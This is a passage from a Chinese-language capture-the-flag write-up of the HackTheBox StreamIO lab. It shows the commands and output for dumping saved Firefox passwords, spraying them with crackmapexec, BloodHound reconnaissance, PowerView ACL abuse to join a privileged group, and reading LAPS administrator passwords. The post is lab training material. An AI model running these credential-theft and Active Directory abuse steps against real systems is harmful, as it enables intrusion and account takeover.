<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg"></a></p>
<p>可以看到，这台电脑安装了firefox且找到了firefox的凭据文件，可以利用<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>把密码dump出来：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg"></a></p>
<p>下载下来并解压后，就可以看到密码了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> results/firefox_br53rxeg_default_release_password.json </span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;JDgodd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;password@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:51-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;yoshihide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;paddpadd@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:24-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;nikk37&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;n1kk1sd0p3t00:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:10-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:40:56-08:00&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是直接利用<code>JDgodd:password@12</code>无法认证成功，似乎还需要我们重新爆破一下。整理一下账号密码：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg"></a></p>
<p>利用cme爆破一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec smb 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>得到账号密码：<code>streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</code>，但是得到了这组账号密码我们仍然无法利用evil-winrm成功登录。用cme的爆破一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec winrm 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)</span><br><span class="line">HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r</span><br></pre></td></tr></table></figure>

<p>不难发现，JDgodd这个账户我们没法远程登录。那利用bloodhound-python远程收集一波信息吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bloodhound-python -d streamio.htb -u JDgodd -p &quot;JDg0dd1s@d0p3cr3@t0r&quot;  -c All  -ns 10.10.11.158 -dc streamio.htb --zip </span></span><br><span class="line">INFO: Found AD domain: streamio.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 54 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 4 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.streamIO.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 20S</span><br><span class="line">INFO: Compressing output into 20231210133117_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p>导入到BloodHound中，可以找到解决办法：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg"></a></p>
<p>BloodHound告诉我们可以使用PowerView中的Add-DomainObjectAcl函数来向core staff组中添加成员。接下来我们登录到nikk37，上传powerview并导入：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload ../../../../../home/rainb0w/Tools/PowerSploit/Recon/PowerView.ps1  .</span><br><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>存储凭据：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;streamIO.htb\JDgodd&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure>

<p>通过Add-DomainObjectAcl赋予所有的权力，并通过Add-DomainGroupMember添加nikk37到CORE STAFF组中：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CORE STAFF&quot;</span> <span class="literal">-Rights</span> All <span class="literal">-PrincipalIdentity</span> JDgodd</span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;CORE STAFF&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;nikk37&#x27;</span> <span class="literal">-Cred</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>

<p>接下来可以利用这篇文章：<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> 中介绍的方法去dump laps凭据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.11.158 -u nikk37 -p <span class="string">&#x27;get_dem_girls2@yahoo.com&#x27;</span> –kdcHost 10.10.11.158 -M laps</span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://10.10.11.158 -D nikk37@streamio.htb -w <span class="string">&quot;get_dem_girls2@yahoo.com&quot;</span> -b <span class="string">&quot;dc=streamio,dc=htb&quot;</span> <span class="string">&quot;(ms-MCs-admpwd=*)&quot;</span>|grep ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure>

<p>最后利用得到的密码登录到Administrator，拿到Root Flag：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道靶机并不困难，只是考点比较多，因此打起来也感到比较繁琐费力，因此个人认为还是值得Medium难度。</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetAdministrator"><span class="toc-number">3.</span> <span class="toc-text">GetAdministrator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&text=[hackthebox]StreamIO WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&is_video=false&description=[hackthebox]StreamIO WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[hackthebox]StreamIO WriteUp&body=Check out this article: https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&name=[hackthebox]StreamIO WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&t=[hackthebox]StreamIO WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    1970-2099
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
